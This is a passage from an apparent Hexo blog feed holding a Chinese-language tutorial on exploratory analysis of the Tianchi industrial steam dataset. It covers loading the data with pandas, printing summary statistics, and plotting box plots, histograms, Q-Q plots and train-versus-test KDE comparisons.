mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span> 就可以了。</p>]]></content>
      
      
      <categories>
          
          <category> 天池机器学习入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工业蒸汽数据分析</title>
      <link href="/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%A4%A9%E6%B1%A0/%E5%B7%A5%E4%B8%9A%E8%92%B8%E6%B1%BD%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/"/>
      <url>/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%A4%A9%E6%B1%A0/%E5%B7%A5%E4%B8%9A%E8%92%B8%E6%B1%BD%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="导入数据探索的工具包"><a class="markdownIt-Anchor" href="#导入数据探索的工具包">#</a> 导入数据探索的工具包</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scipy <span class="keyword">import</span> stats</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"> </span><br><span class="line">%matplotlib inline</span><br></pre></td></tr></table></figure><h1 id="读取数据文件"><a class="markdownIt-Anchor" href="#读取数据文件">#</a> 读取数据文件</h1><p>使用 Pandas 库 read_csv () 函数进行数据读取，分割符为‘\t’</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载需要用到的数据集</span></span><br><span class="line">!wget http://tianchi-media.oss-cn-beijing.aliyuncs.com/DSW/Industrial_Steam_Forecast/zhengqi_test.txt</span><br><span class="line">!wget http://tianchi-media.oss-cn-beijing.aliyuncs.com/DSW/Industrial_Steam_Forecast/zhengqi_train.txt</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">train_data_file = <span class="string">&quot;./zhengqi_train.txt&quot;</span></span><br><span class="line">test_data_file =  <span class="string">&quot;./zhengqi_test.txt&quot;</span></span><br><span class="line"></span><br><span class="line">train_data = pd.read_csv(train_data_file, sep=<span class="string">&#x27;\t&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">test_data = pd.read_csv(test_data_file, sep=<span class="string">&#x27;\t&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="查看训练集特征变量信息"><a class="markdownIt-Anchor" href="#查看训练集特征变量信息">#</a> 查看训练集特征变量信息</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">train_data.info()</span><br></pre></td></tr></table></figure><pre><code>&lt;class 'pandas.core.frame.DataFrame'&gt;RangeIndex: 2888 entries, 0 to 2887Data columns (total 39 columns): #   Column  Non-Null Count  Dtype  ---  ------  --------------  -----   0   V0      2888 non-null   float64 1   V1      2888 non-null   float64 2   V2      2888 non-null   float64 3   V3      2888 non-null   float64 4   V4      2888 non-null   float64 5   V5      2888 non-null   float64 6   V6      2888 non-null   float64 7   V7      2888 non-null   float64 8   V8      2888 non-null   float64 9   V9      2888 non-null   float64 10  V10     2888 non-null   float64 11  V11     2888 non-null   float64 12  V12     2888 non-null   float64 13  V13     2888 non-null   float64 14  V14     2888 non-null   float64 15  V15     2888 non-null   float64 16  V16     2888 non-null   float64 17  V17     2888 non-null   float64 18  V18     2888 non-null   float64 19  V19     2888 non-null   float64 20  V20     2888 non-null   float64 21  V21     2888 non-null   float64 22  V22     2888 non-null   float64 23  V23     2888 non-null   float64 24  V24     2888 non-null   float64 25  V25     2888 non-null   float64 26  V26     2888 non-null   float64 27  V27     2888 non-null   float64 28  V28     2888 non-null   float64 29  V29     2888 non-null   float64 30  V30     2888 non-null   float64 31  V31     2888 non-null   float64 32  V32     2888 non-null   float64 33  V33     2888 non-null   float64 34  V34     2888 non-null   float64 35  V35     2888 non-null   float64 36  V36     2888 non-null   float64 37  V37     2888 non-null   float64 38  target  2888 non-null   float64dtypes: float64(39)memory usage: 880.1 KB</code></pre><p>此训练集数据共有 2888 个样本，数据中有 V0-V37 共计 38 个特征变量，变量类型都为数值类型，所有数据特征没有缺失值数据； 数据字段由于采用了脱敏处理，删除了特征数据的具体含义；target 字段为标签变量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">test_data.info()</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>&lt;class 'pandas.core.frame.DataFrame'&gt;RangeIndex: 1925 entries, 0 to 1924Data columns (total 38 columns): #   Column  Non-Null Count  Dtype  ---  ------  --------------  -----   0   V0      1925 non-null   float64 1   V1      1925 non-null   float64 2   V2      1925 non-null   float64 3   V3      1925 non-null   float64 4   V4      1925 non-null   float64 5   V5      1925 non-null   float64 6   V6      1925 non-null   float64 7   V7      1925 non-null   float64 8   V8      1925 non-null   float64 9   V9      1925 non-null   float64 10  V10     1925 non-null   float64 11  V11     1925 non-null   float64 12  V12     1925 non-null   float64 13  V13     1925 non-null   float64 14  V14     1925 non-null   float64 15  V15     1925 non-null   float64 16  V16     1925 non-null   float64 17  V17     1925 non-null   float64 18  V18     1925 non-null   float64 19  V19     1925 non-null   float64 20  V20     1925 non-null   float64 21  V21     1925 non-null   float64 22  V22     1925 non-null   float64 23  V23     1925 non-null   float64 24  V24     1925 non-null   float64 25  V25     1925 non-null   float64 26  V26     1925 non-null   float64 27  V27     1925 non-null   float64 28  V28     1925 non-null   float64 29  V29     1925 non-null   float64 30  V30     1925 non-null   float64 31  V31     1925 non-null   float64 32  V32     1925 non-null   float64 33  V33     1925 non-null   float64 34  V34     1925 non-null   float64 35  V35     1925 non-null   float64 36  V36     1925 non-null   float64 37  V37     1925 non-null   float64dtypes: float64(38)memory usage: 571.6 KB</code></pre><p>测试集数据共有 1925 个样本，数据中有 V0-V37 共计 38 个特征变量，变量类型都为数值类型</p><h1 id="查看数据统计信息"><a class="markdownIt-Anchor" href="#查看数据统计信息">#</a> 查看数据统计信息</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">train_data.describe()</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre></style><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>V0</th>      <th>V1</th>      <th>V2</th>      <th>V3</th>      <th>V4</th>      <th>V5</th>      <th>V6</th>      <th>V7</th>      <th>V8</th>      <th>V9</th>      <th>...</th>      <th>V29</th>      <th>V30</th>      <th>V31</th>      <th>V32</th>      <th>V33</th>      <th>V34</th>      <th>V35</th>      <th>V36</th>      <th>V37</th>      <th>target</th>    </tr>  </thead>  <tbody>    <tr>      <th>count</th>      <td>2888.000000</td>      <td>2888.000000</td>      <td>2888.000000</td>      <td>2888.000000</td>      <td>2888.000000</td>      <td>2888.000000</td>      <td>2888.000000</td>      <td>2888.000000</td>      <td>2888.000000</td>      <td>2888.000000</td>      <td>...</td>      <td>2888.000000</td>      <td>2888.000000</td>      <td>2888.000000</td>      <td>2888.000000</td>      <td>2888.000000</td>      <td>2888.000000</td>      <td>2888.000000</td>      <td>2888.000000</td>      <td>2888.000000</td>      <td>2888.000000</td>    </tr>    <tr>      <th>mean</th>      <td>0.123048</td>      <td>0.056068</td>      <td>0.289720</td>      <td>-0.067790</td>      <td>0.012921</td>      <td>-0.558565</td>      <td>0.182892</td>      <td>0.116155</td>      <td>0.177856</td>      <td>-0.169452</td>      <td>...</td>      <td>0.097648</td>      <td>0.055477</td>      <td>0.127791</td>      <td>0.020806</td>      <td>0.007801</td>      <td>0.006715</td>      <td>0.197764</td>      <td>0.030658</td>      <td>-0.130330</td>      <td>0.126353</td>    </tr>    <tr>      <th>std</th>      <td>0.928031</td>      <td>0.941515</td>      <td>0.911236</td>      <td>0.970298</td>      <td>0.888377</td>      <td>0.517957</td>      <td>0.918054</td>      <td>0.955116</td>      <td>0.895444</td>      <td>0.953813</td>      <td>...</td>      <td>1.061200</td>      <td>0.901934</td>      <td>0.873028</td>      <td>0.902584</td>      <td>1.006995</td>      <td>1.003291</td>      <td>0.985675</td>      <td>0.970812</td>      <td>1.017196</td>      <td>0.983966</td>    </tr>    <tr>      <th>min</th>      <td>-4.335000</td>      <td>-5.122000</td>      <td>-3.420000</td>      <td>-3.956000</td>      <td>-4.742000</td>      <td>-2.182000</td>      <td>-4.576000</td>      <td>-5.048000</td>      <td>-4.692000</td>      <td>-12.891000</td>      <td>...</td>      <td>-2.912000</td>      <td>-4.507000</td>      <td>-5.859000</td>      <td>-4.053000</td>      <td>-4.627000</td>      <td>-4.789000</td>      <td>-5.695000</td>      <td>-2.608000</td>      <td>-3.630000</td>      <td>-3.044000</td>    </tr>    <tr>      <th>25%</th>      <td>-0.297000</td>      <td>-0.226250</td>      <td>-0.313000</td>      <td>-0.652250</td>      <td>-0.385000</td>      <td>-0.853000</td>      <td>-0.310000</td>      <td>-0.295000</td>      <td>-0.159000</td>      <td>-0.390000</td>      <td>...</td>      <td>-0.664000</td>      <td>-0.283000</td>      <td>-0.170250</td>      <td>-0.407250</td>      <td>-0.499000</td>      <td>-0.290000</td>      <td>-0.202500</td>      <td>-0.413000</td>      <td>-0.798250</td>      <td>-0.350250</td>    </tr>    <tr>      <th>50%</th>      <td>0.359000</td>      <td>0.272500</td>      <td>0.386000</td>      <td>-0.044500</td>      <td>0.110000</td>      <td>-0.466000</td>      <td>0.388000</td>      <td>0.344000</td>      <td>0.362000</td>      <td>0.042000</td>      <td>...</td>      <td>-0.023000</td>      <td>0.053500</td>      <td>0.299500</td>      <td>0.039000</td>      <td>-0.040000</td>      <td>0.160000</td>      <td>0.364000</td>      <td>0.137000</td>      <td>-0.185500</td>      <td>0.313000</td>    </tr>    <tr>      <th>75%</th>      <td>0.726000</td>      <td>0.599000</td>      <td>0.918250</td>      <td>0.624000</td>      <td>0.550250</td>      <td>-0.154000</td>      <td>0.831250</td>      <td>0.782250</td>      <td>0.726000</td>      <td>0.042000</td>      <td>...</td>      <td>0.745250</td>      <td>0.488000</td>      <td>0.635000</td>      <td>0.557000</td>      <td>0.462000</td>      <td>0.273000</td>      <td>0.602000</td>      <td>0.644250</td>      <td>0.495250</td>      <td>0.793250</td>    </tr>    <tr>      <th>max</th>      <td>2.121000</td>      <td>1.918000</td>      <td>2.828000</td>      <td>2.457000</td>      <td>2.689000</td>      <td>0.489000</td>      <td>1.895000</td>      <td>1.918000</td>      <td>2.245000</td>      <td>1.335000</td>      <td>...</td>      <td>4.580000</td>      <td>2.689000</td>      <td>2.013000</td>      <td>2.395000</td>      <td>5.465000</td>      <td>5.110000</td>      <td>2.324000</td>      <td>5.238000</td>      <td>3.000000</td>      <td>2.538000</td>    </tr>  </tbody></table><p>8 rows × 39 columns</p></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test_data.describe()</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre></style><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>V0</th>      <th>V1</th>      <th>V2</th>      <th>V3</th>      <th>V4</th>      <th>V5</th>      <th>V6</th>      <th>V7</th>      <th>V8</th>      <th>V9</th>      <th>...</th>      <th>V28</th>      <th>V29</th>      <th>V30</th>      <th>V31</th>      <th>V32</th>      <th>V33</th>      <th>V34</th>      <th>V35</th>      <th>V36</th>      <th>V37</th>    </tr>  </thead>  <tbody>    <tr>      <th>count</th>      <td>1925.000000</td>      <td>1925.000000</td>      <td>1925.000000</td>      <td>1925.000000</td>      <td>1925.000000</td>      <td>1925.000000</td>      <td>1925.000000</td>      <td>1925.000000</td>      <td>1925.000000</td>      <td>1925.000000</td>      <td>...</td>      <td>1925.000000</td>      <td>1925.000000</td>      <td>1925.000000</td>      <td>1925.000000</td>      <td>1925.000000</td>      <td>1925.000000</td>      <td>1925.000000</td>      <td>1925.000000</td>      <td>1925.000000</td>      <td>1925.000000</td>    </tr>    <tr>      <th>mean</th>      <td>-0.184404</td>      <td>-0.083912</td>      <td>-0.434762</td>      <td>0.101671</td>      <td>-0.019172</td>      <td>0.838049</td>      <td>-0.274092</td>      <td>-0.173971</td>      <td>-0.266709</td>      <td>0.255114</td>      <td>...</td>      <td>-0.206871</td>      <td>-0.146463</td>      <td>-0.083215</td>      <td>-0.191729</td>      <td>-0.030782</td>      <td>-0.011433</td>      <td>-0.009985</td>      <td>-0.296895</td>      <td>-0.046270</td>      <td>0.195735</td>    </tr>    <tr>      <th>std</th>      <td>1.073333</td>      <td>1.076670</td>      <td>0.969541</td>      <td>1.034925</td>      <td>1.147286</td>      <td>0.963043</td>      <td>1.054119</td>      <td>1.040101</td>      <td>1.085916</td>      <td>1.014394</td>      <td>...</td>      <td>1.064140</td>      <td>0.880593</td>      <td>1.126414</td>      <td>1.138454</td>      <td>1.130228</td>      <td>0.989732</td>      <td>0.995213</td>      <td>0.946896</td>      <td>1.040854</td>      <td>0.940599</td>    </tr>    <tr>      <th>min</th>      <td>-4.814000</td>      <td>-5.488000</td>      <td>-4.283000</td>      <td>-3.276000</td>      <td>-4.921000</td>      <td>-1.168000</td>      <td>-5.649000</td>      <td>-5.625000</td>      <td>-6.059000</td>      <td>-6.784000</td>      <td>...</td>      <td>-2.435000</td>      <td>-2.413000</td>      <td>-4.507000</td>      <td>-7.698000</td>      <td>-4.057000</td>      <td>-4.627000</td>      <td>-4.789000</td>      <td>-7.477000</td>      <td>-2.608000</td>      <td>-3.346000</td>    </tr>    <tr>      <th>25%</th>      <td>-0.664000</td>      <td>-0.451000</td>      <td>-0.978000</td>      <td>-0.644000</td>      <td>-0.497000</td>      <td>0.122000</td>      <td>-0.732000</td>      <td>-0.509000</td>      <td>-0.775000</td>      <td>-0.390000</td>      <td>...</td>      <td>-0.453000</td>      <td>-0.818000</td>      <td>-0.339000</td>      <td>-0.476000</td>      <td>-0.472000</td>      <td>-0.460000</td>      <td>-0.290000</td>      <td>-0.349000</td>      <td>-0.593000</td>      <td>-0.432000</td>    </tr>    <tr>      <th>50%</th>      <td>0.065000</td>      <td>0.195000</td>      <td>-0.267000</td>      <td>0.220000</td>      <td>0.118000</td>      <td>0.437000</td>      <td>-0.082000</td>      <td>0.018000</td>      <td>-0.004000</td>      <td>0.401000</td>      <td>...</td>      <td>-0.445000</td>      <td>-0.199000</td>      <td>0.010000</td>      <td>0.100000</td>      <td>0.155000</td>      <td>-0.040000</td>      <td>0.160000</td>      <td>-0.270000</td>      <td>0.083000</td>      <td>0.152000</td>    </tr>    <tr>      <th>75%</th>      <td>0.549000</td>      <td>0.589000</td>      <td>0.278000</td>      <td>0.793000</td>      <td>0.610000</td>      <td>1.928000</td>      <td>0.457000</td>      <td>0.515000</td>      <td>0.482000</td>      <td>0.904000</td>      <td>...</td>      <td>-0.434000</td>      <td>0.468000</td>      <td>0.447000</td>      <td>0.471000</td>      <td>0.627000</td>      <td>0.419000</td>      <td>0.273000</td>      <td>0.364000</td>      <td>0.651000</td>      <td>0.797000</td>    </tr>    <tr>      <th>max</th>      <td>2.100000</td>      <td>2.120000</td>      <td>1.946000</td>      <td>2.603000</td>      <td>4.475000</td>      <td>3.176000</td>      <td>1.528000</td>      <td>1.394000</td>      <td>2.408000</td>      <td>1.766000</td>      <td>...</td>      <td>4.656000</td>      <td>3.022000</td>      <td>3.139000</td>      <td>1.428000</td>      <td>2.299000</td>      <td>5.465000</td>      <td>5.110000</td>      <td>1.671000</td>      <td>2.861000</td>      <td>3.021000</td>    </tr>  </tbody></table><p>8 rows × 38 columns</p></div><p>上面数据显示了数据的统计信息，例如样本数，数据的均值 mean，标准差 std，最小值，最大值等</p><h1 id="查看数据字段信息"><a class="markdownIt-Anchor" href="#查看数据字段信息">#</a> 查看数据字段信息</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">train_data.head()</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre></style><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>V0</th>      <th>V1</th>      <th>V2</th>      <th>V3</th>      <th>V4</th>      <th>V5</th>      <th>V6</th>      <th>V7</th>      <th>V8</th>      <th>V9</th>      <th>...</th>      <th>V29</th>      <th>V30</th>      <th>V31</th>      <th>V32</th>      <th>V33</th>      <th>V34</th>      <th>V35</th>      <th>V36</th>      <th>V37</th>      <th>target</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>0.566</td>      <td>0.016</td>      <td>-0.143</td>      <td>0.407</td>      <td>0.452</td>      <td>-0.901</td>      <td>-1.812</td>      <td>-2.360</td>      <td>-0.436</td>      <td>-2.114</td>      <td>...</td>      <td>0.136</td>      <td>0.109</td>      <td>-0.615</td>      <td>0.327</td>      <td>-4.627</td>      <td>-4.789</td>      <td>-5.101</td>      <td>-2.608</td>      <td>-3.508</td>      <td>0.175</td>    </tr>    <tr>      <th>1</th>      <td>0.968</td>      <td>0.437</td>      <td>0.066</td>      <td>0.566</td>      <td>0.194</td>      <td>-0.893</td>      <td>-1.566</td>      <td>-2.360</td>      <td>0.332</td>      <td>-2.114</td>      <td>...</td>      <td>-0.128</td>      <td>0.124</td>      <td>0.032</td>      <td>0.600</td>      <td>-0.843</td>      <td>0.160</td>      <td>0.364</td>      <td>-0.335</td>      <td>-0.730</td>      <td>0.676</td>    </tr>    <tr>      <th>2</th>      <td>1.013</td>      <td>0.568</td>      <td>0.235</td>      <td>0.370</td>      <td>0.112</td>      <td>-0.797</td>      <td>-1.367</td>      <td>-2.360</td>      <td>0.396</td>      <td>-2.114</td>      <td>...</td>      <td>-0.009</td>      <td>0.361</td>      <td>0.277</td>      <td>-0.116</td>      <td>-0.843</td>      <td>0.160</td>      <td>0.364</td>      <td>0.765</td>      <td>-0.589</td>      <td>0.633</td>    </tr>    <tr>      <th>3</th>      <td>0.733</td>      <td>0.368</td>      <td>0.283</td>      <td>0.165</td>      <td>0.599</td>      <td>-0.679</td>      <td>-1.200</td>      <td>-2.086</td>      <td>0.403</td>      <td>-2.114</td>      <td>...</td>      <td>0.015</td>      <td>0.417</td>      <td>0.279</td>      <td>0.603</td>      <td>-0.843</td>      <td>-0.065</td>      <td>0.364</td>      <td>0.333</td>      <td>-0.112</td>      <td>0.206</td>    </tr>    <tr>      <th>4</th>      <td>0.684</td>      <td>0.638</td>      <td>0.260</td>      <td>0.209</td>      <td>0.337</td>      <td>-0.454</td>      <td>-1.073</td>      <td>-2.086</td>      <td>0.314</td>      <td>-2.114</td>      <td>...</td>      <td>0.183</td>      <td>1.078</td>      <td>0.328</td>      <td>0.418</td>      <td>-0.843</td>      <td>-0.215</td>      <td>0.364</td>      <td>-0.280</td>      <td>-0.028</td>      <td>0.384</td>    </tr>  </tbody></table><p>5 rows × 39 columns</p></div><p>上面显示训练集前 5 条数据的基本信息，可以看到数据都是浮点型数据，数据都是数值型连续型特征</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test_data.head()</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre></style><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>V0</th>      <th>V1</th>      <th>V2</th>      <th>V3</th>      <th>V4</th>      <th>V5</th>      <th>V6</th>      <th>V7</th>      <th>V8</th>      <th>V9</th>      <th>...</th>      <th>V28</th>      <th>V29</th>      <th>V30</th>      <th>V31</th>      <th>V32</th>      <th>V33</th>      <th>V34</th>      <th>V35</th>      <th>V36</th>      <th>V37</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>0.368</td>      <td>0.380</td>      <td>-0.225</td>      <td>-0.049</td>      <td>0.379</td>      <td>0.092</td>      <td>0.550</td>      <td>0.551</td>      <td>0.244</td>      <td>0.904</td>      <td>...</td>      <td>-0.449</td>      <td>0.047</td>      <td>0.057</td>      <td>-0.042</td>      <td>0.847</td>      <td>0.534</td>      <td>-0.009</td>      <td>-0.190</td>      <td>-0.567</td>      <td>0.388</td>    </tr>    <tr>      <th>1</th>      <td>0.148</td>      <td>0.489</td>      <td>-0.247</td>      <td>-0.049</td>      <td>0.122</td>      <td>-0.201</td>      <td>0.487</td>      <td>0.493</td>      <td>-0.127</td>      <td>0.904</td>      <td>...</td>      <td>-0.443</td>      <td>0.047</td>      <td>0.560</td>      <td>0.176</td>      <td>0.551</td>      <td>0.046</td>      <td>-0.220</td>      <td>0.008</td>      <td>-0.294</td>      <td>0.104</td>    </tr>    <tr>      <th>2</th>      <td>-0.166</td>      <td>-0.062</td>      <td>-0.311</td>      <td>0.046</td>      <td>-0.055</td>      <td>0.063</td>      <td>0.485</td>      <td>0.493</td>      <td>-0.227</td>      <td>0.904</td>      <td>...</td>      <td>-0.458</td>      <td>-0.398</td>      <td>0.101</td>      <td>0.199</td>      <td>0.634</td>      <td>0.017</td>      <td>-0.234</td>      <td>0.008</td>      <td>0.373</td>      <td>0.569</td>    </tr>    <tr>      <th>3</th>      <td>0.102</td>      <td>0.294</td>      <td>-0.259</td>      <td>0.051</td>      <td>-0.183</td>      <td>0.148</td>      <td>0.474</td>      <td>0.504</td>      <td>0.010</td>      <td>0.904</td>      <td>...</td>      <td>-0.456</td>      <td>-0.398</td>      <td>1.007</td>      <td>0.137</td>      <td>1.042</td>      <td>-0.040</td>      <td>-0.290</td>      <td>0.008</td>      <td>-0.666</td>      <td>0.391</td>    </tr>    <tr>      <th>4</th>      <td>0.300</td>      <td>0.428</td>      <td>0.208</td>      <td>0.051</td>      <td>-0.033</td>      <td>0.116</td>      <td>0.408</td>      <td>0.497</td>      <td>0.155</td>      <td>0.904</td>      <td>...</td>      <td>-0.458</td>      <td>-0.776</td>      <td>0.291</td>      <td>0.370</td>      <td>0.181</td>      <td>-0.040</td>      <td>-0.290</td>      <td>0.008</td>      <td>-0.140</td>      <td>-0.497</td>    </tr>  </tbody></table><p>5 rows × 38 columns</p></div><h1 id="画箱形图探索数据"><a class="markdownIt-Anchor" href="#画箱形图探索数据">#</a> 画箱形图探索数据</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fig = plt.figure(figsize=(<span class="number">4</span>, <span class="number">6</span>))  <span class="comment"># 指定绘图对象宽度和高度</span></span><br><span class="line">sns.boxplot(train_data[<span class="string">&#x27;V0&#x27;</span>],orient=<span class="string">&quot;v&quot;</span>, width=<span class="number">0.5</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>&lt;AxesSubplot:xlabel='V0'&gt;</code></pre><p>​<br><img "" class="lazyload placeholder" data-original="output_17_1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 画箱式图</span></span><br><span class="line">column = train_data.columns.tolist()[:<span class="number">39</span>]  <span class="comment"># 列表头</span></span><br><span class="line">fig = plt.figure(figsize=(<span class="number">20</span>, <span class="number">40</span>))  <span class="comment"># 指定绘图对象宽度和高度</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>):</span><br><span class="line">    plt.subplot(<span class="number">13</span>, <span class="number">3</span>, i + <span class="number">1</span>)  <span class="comment"># 13行3列子图</span></span><br><span class="line">    sns.boxplot(train_data[column[i]], orient=<span class="string">&quot;v&quot;</span>, width=<span class="number">0.5</span>)  <span class="comment"># 箱式图</span></span><br><span class="line">    plt.ylabel(column[i], fontsize=<span class="number">8</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>​<br><img "" class="lazyload placeholder" data-original="output_18_0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><h1 id="查看数据分布图"><a class="markdownIt-Anchor" href="#查看数据分布图">#</a> 查看数据分布图</h1><p>查看特征变量‘V0’的数据分布直方图，并绘制 Q-Q 图查看数据是否近似于正态分布</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">plt.figure(figsize=(<span class="number">10</span>,<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">ax=plt.subplot(<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">sns.distplot(train_data[<span class="string">&#x27;V0&#x27;</span>],fit=stats.norm)</span><br><span class="line">ax=plt.subplot(<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">res = stats.probplot(train_data[<span class="string">&#x27;V0&#x27;</span>], plot=plt)</span><br></pre></td></tr></table></figure><p>​<br><img "" class="lazyload placeholder" data-original="output_20_0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><p>查看查看所有数据的直方图和 Q-Q 图，查看训练集的数据是否近似于正态分布</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">train_cols = <span class="number">6</span></span><br><span class="line">train_rows = <span class="built_in">len</span>(train_data.columns)</span><br><span class="line">plt.figure(figsize=(<span class="number">4</span>*train_cols,<span class="number">4</span>*train_rows))</span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> col <span class="keyword">in</span> train_data.columns:</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    ax=plt.subplot(train_rows,train_cols,i)</span><br><span class="line">    sns.distplot(train_data[col],fit=stats.norm)</span><br><span class="line">    </span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    ax=plt.subplot(train_rows,train_cols,i)</span><br><span class="line">    res = stats.probplot(train_data[col], plot=plt)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>​<br><img "" class="lazyload placeholder" data-original="output_22_0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><p>由上面的数据分布图信息可以看出，很多特征变量（如’V1’,‘V9’,‘V24’,'V28’等）的数据分布不是正态的，数据并不跟随对角线，后续可以使用数据变换对数据进行转换。</p><p>对比同一特征变量‘V0’下，训练集数据和测试集数据的分布情况，查看数据分布是否一致</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ax = sns.kdeplot(train_data[<span class="string">&#x27;V0&#x27;</span>], color=<span class="string">&quot;Red&quot;</span>, shade=<span class="literal">True</span>)</span><br><span class="line">ax = sns.kdeplot(test_data[<span class="string">&#x27;V0&#x27;</span>], color=<span class="string">&quot;Blue&quot;</span>, shade=<span class="literal">True</span>)</span><br><span class="line">ax.set_xlabel(<span class="string">&#x27;V0&#x27;</span>)</span><br><span class="line">ax.set_ylabel(<span 